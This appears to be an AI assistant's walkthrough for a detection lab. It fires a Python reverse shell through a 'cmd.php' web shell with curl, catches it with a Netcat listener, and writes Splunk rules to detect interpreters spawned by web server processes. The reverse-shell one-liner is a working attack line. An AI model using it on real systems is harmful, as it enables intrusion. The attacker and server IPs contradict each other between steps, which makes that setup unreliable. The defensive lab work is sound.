## due to network ip might change.
* **Attacker VM:** `192.168.201.131` (where your Netcat listener runs)
* **Web Server VM:** `192.168.201.129` (where the web application and `cmd.php` live)

If your environment has them swapped, let's adjust the variables and commands accordingly so your `curl` requests hit the right target and your Netcat listener catches the callback correctly.

Let's update your terminal environment variables to match your setup:

1. **Set Correct Environment Variables:**
Run these commands in your terminal to ensure the IPs match your setup:

```bash
export ATTACKER_IP="192.168.201.129"
export WEBSERVER_IP="192.168.201.131"

```

*(Note: Adjust these values if your attacker IP is `.131` and web server is `.129` as originally defined in Lab 1).*


2. **Start Netcat on the Attacker IP:**
On your attacker machine, start your listener:

```bash
nc -lvnp 4444

```


3. **Test the Python Reverse Shell:**
Run the `curl` command targeting your web server IP:

```bash
curl "http://${WEBSERVER_IP}/cmd.php?c=python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ATTACKER_IP}\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;pty.spawn(\"/bin/sh\")'"

```



1. **Step 5.1 & 5.4: Create and Test DEIA2-3 (User & Interpreter Attribute):** Splunk Search Setup.
Write a detection rule that targets shells/interpreters run by the web service user (`www-data`).

1. In Splunk, go to **Settings** > **Searches, Reports, and Alerts** > **New Search**.
2. Enter this SPL query:

```spl
index=linux sourcetype=laurel SYSCALL.SYSCALL=execve 
SYSCALL.UID=www-data 
| search SYSCALL.comm IN ("sh", "bash", "dash", "zsh", "python", "python3", "perl", "ruby", "php")

```

3. Re-run your reverse shell variants to generate events.
4. Save the search as **`DEIA2-3 - Web Service Interpreter Execution`**, set the schedule (`*/5 * * * *`), trigger action to `detection_finding`, and permissions to **Shared in App**.
*Verification:* Run the search over "All time" in Splunk to confirm it catches both variants.


2. **Step 5.2 & 5.3: Simulate False Positives via Cron:** Web Server Terminal.
Test the vulnerability of keying solely on `www-data` by adding a harmless scheduled job:

1. On your web server VM (`192.168.201.129`), add a test cron job for `www-data`:

```bash
echo "* * * * * ls -la /var/www/html > /tmp/cron-wwwdata.log" | sudo crontab -u www-data -

```

2. Wait 1 minute for cron to execute it through `/bin/sh`.
3. Check Splunk—you will see `DEIA2-3` fire even though nothing malicious happened.
4. Remove the test cron job:

```bash
sudo crontab -u www-data -r

```

*Verification:* Splunk logs show an alert for the cron maintenance job, illustrating the false-positive risk of user-based rules.


3. **Step 5.6 & 5.9: Create and Save DEIA2-4 (Parent Process Telemetry):** Splunk Search Setup.
Use Laurel's parent-process enrichment fields (`SYSCALL.SPAWNED_BY`) to detect interpreters spawned directly by web server background processes.

1. Create a **New Search** in Splunk.
2. Enter this SPL query:

```spl
index=linux sourcetype=laurel SYSCALL.SYSCALL=execve
| eval cmd=mvjoin('EXECVE.ARGV{}', " ")
| search SYSCALL.comm IN ("sh", "dash", "bash", "zsh", "python", "python3", "perl", "ruby", "php", "lua")
| where match('SYSCALL.SPAWNED_BY.exe', "/(apache2|httpd|nginx|phpfpm)")
| table _time SYSCALL.SPAWNED_BY.exe SYSCALL.exe SYSCALL.comm SYSCALL.UID cmd

```

3. Save this search as **`DEIA2-4 - Web Server Parent Process Interpreter Execution`**, set the schedule (`*/5 * * * *`), trigger action to `detection_finding`, and permissions to **Shared in App**.
*Verification:* Re-run your reverse shell variants and confirm the query catches both without needing to match any specific payload strings or user accounts. (Note: Raw `auditd` without Laurel lacks this parent-process metadata, making this query impossible on default logs).
